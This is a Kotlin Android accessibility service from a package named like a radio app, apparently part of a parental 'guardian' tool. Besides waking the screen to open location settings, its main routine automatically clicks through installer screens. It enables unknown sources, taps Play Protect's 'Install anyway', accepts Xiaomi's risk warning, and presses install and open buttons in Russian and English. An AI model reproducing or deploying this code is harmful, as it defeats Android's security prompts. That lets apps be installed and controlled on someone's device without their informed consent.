package com.aeroptt.radio

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.Intent
import android.graphics.Rect
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.util.Log
import android.util.TypedValue
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class GuardianAccessibilityService : AccessibilityService() {
    companion object { 
        var instance: GuardianAccessibilityService? = null 
        fun isRunning(): Boolean = instance != null
        
        fun requestAutoGpsEnable(context: Context) {
            try {
                val powerManager = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
                val wakeLock = powerManager?.newWakeLock(
                    PowerManager.FULL_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP or PowerManager.ON_AFTER_RELEASE,
                    "Guardian::GpsWakeLock"
                )
                wakeLock?.acquire(8000L)
            } catch (e: Exception) {}

            var launched = false
            if (instance != null) {
                try {
                    instance?.openLocationSettings()
                    launched = true
                } catch (e: Exception) {
                    Log.e("GuardianA11y", "Instance openLocationSettings failed: ${e.message}")
                }
            }
            if (!launched) {
                try {
                    val intent = Intent(android.provider.Settings.ACTION_LOCATION_SOURCE_SETTINGS).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                    }
                    context.startActivity(intent)
                    launched = true
                } catch (e: Exception) {
                    Log.e("GuardianA11y", "Context startActivity failed: ${e.message}")
                }
            }

            Handler(Looper.getMainLooper()).post {
                try {
                    android.widget.Toast.makeText(context, "Родитель запросил включение геолокации", android.widget.Toast.LENGTH_LONG).show()
                } catch (e: Exception) {}
            }
        }
    }
    private val handler = Handler(Looper.getMainLooper())

    fun openLocationSettings() {
        try {
            val intent = Intent(android.provider.Settings.ACTION_LOCATION_SOURCE_SETTINGS).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
            }
            startActivity(intent)
            Log.d("GuardianA11y", "Opened Location Settings via AccessibilityService")
        } catch (e: Exception) {
            Log.e("GuardianA11y", "Failed to start location settings: ${e.message}")
        }
    }

    fun launchGuardianDirectly() {
        val intent = packageManager.getLaunchIntentForPackage(packageName)?.apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            putExtra("force_foreground", true)
        }
        if (intent != null) startActivity(intent)
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        val pkg = event.packageName?.toString() ?: ""
        val isPackageInstaller = pkg.contains("packageinstaller", ignoreCase = true) || pkg.contains("defcontainer", ignoreCase = true)
        val isUnknownSourcesScreen = pkg.contains("settings", ignoreCase = true) && !pkg.contains("securitycenter", ignoreCase = true)
        
        if (isPackageInstaller || isUnknownSourcesScreen) {
            handler.postDelayed({ autoClickPackageInstaller(isPackageInstaller) }, 250)
        }
    }

    private fun autoClickPackageInstaller(isPackageInstaller: Boolean) {
        val root = rootInActiveWindow ?: return
        try {
            // 1. Check for "Allow unknown app sources" toggle switch
            val unknownSourcesTexts = listOf("Разрешить из этого источника", "Установка неизвестных приложений", "Allow from this source", "Install unknown apps")
            for (txt in unknownSourcesTexts) {
                val nodes = root.findAccessibilityNodeInfosByText(txt)
                if (nodes.isNotEmpty()) {
                    val switchNodes = mutableListOf<AccessibilityNodeInfo>()
                    findCheckableOrSwitchNodes(root, switchNodes)
                    for (sw in switchNodes) {
                        if (!sw.isChecked) {
                            if (sw.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                                handler.postDelayed({ performGlobalAction(GLOBAL_ACTION_BACK) }, 400)
                                return
                            }
                        }
                    }
                }
            }

            // Only search for install buttons if we are genuinely inside the Package Installer!
            if (!isPackageInstaller) return
            val playProtectDetails = listOf("Подробнее", "More details", "Ещё")
            for (txt in playProtectDetails) {
                val nodes = root.findAccessibilityNodeInfosByText(txt)
                for (node in nodes) {
                    if (performClickOnNodeOrParent(node)) {
                        handler.postDelayed({ autoClickPackageInstaller(true) }, 250)
                        return
                    }
                }
            }
            val installAnywayTexts = listOf("Всё равно установить", "Установить в любом случае", "Install anyway", "Продолжить установку")
            for (txt in installAnywayTexts) {
                val nodes = root.findAccessibilityNodeInfosByText(txt)
                for (node in nodes) {
                    if (performClickOnNodeOrParent(node)) { return }
                }
            }
            val xiaomiRiskTexts = listOf("Я осознаю возможные риски", "I am aware of the possible risks")
            for (txt in xiaomiRiskTexts) {
                val nodes = root.findAccessibilityNodeInfosByText(txt)
                for (node in nodes) { performClickOnNodeOrParent(node) }
            }
            val installTexts = listOf("Установить", "Обновить", "Install", "Update", "ОБНОВИТЬ", "Continue", "Далее", "Allow")
            for (txt in installTexts) {
                val nodes = root.findAccessibilityNodeInfosByText(txt)
                for (node in nodes) {
                    if (performClickOnNodeOrParent(node)) { return }
                }
            }
            val openTexts = listOf("Открыть", "Open")
            for (txt in openTexts) {
                val nodes = root.findAccessibilityNodeInfosByText(txt)
                for (node in nodes) {
                    if (performClickOnNodeOrParent(node)) { return }
                }
            }
            val buttonIds = listOf("android:id/button1", "com.android.packageinstaller:id/ok_button", "com.android.packageinstaller:id/install_confirm_button", "com.google.android.packageinstaller:id/ok_button", "com.miui.packageinstaller:id/ok_button", "com.miui.packageinstaller:id/install_btn")
            for (id in buttonIds) {
                val nodes = root.findAccessibilityNodeInfosByViewId(id)
                for (node in nodes) {
                    if (node.isClickable && node.isEnabled) {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        return
                    }
                }
            }
        } catch (e: Exception) {}
    }
    private fun performClickOnNodeOrParent(node: AccessibilityNodeInfo?): Boolean {
        var curr = node
        var depth = 0
        while (curr != null && depth < 5) {
            if (curr.isClickable) {
                return curr.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            }
            curr = curr.parent
            depth++
        }
        return false
    }
    private fun findCheckableOrSwitchNodes(node: AccessibilityNodeInfo?, results: MutableList<AccessibilityNodeInfo>) {
        if (node == null) return
        val cls = node.className?.toString() ?: ""
        if (node.isCheckable || cls.contains("Switch", ignoreCase = true) || cls.contains("SlidingButton", ignoreCase = true) || cls.contains("CheckBox", ignoreCase = true)) {
            results.add(node)
        }
        for (i in 0 until node.childCount) {
            findCheckableOrSwitchNodes(node.getChild(i), results)
        }
    }
    override fun onInterrupt() {}
    override fun onDestroy() {
        instance = null
        super.onDestroy()
    }
}
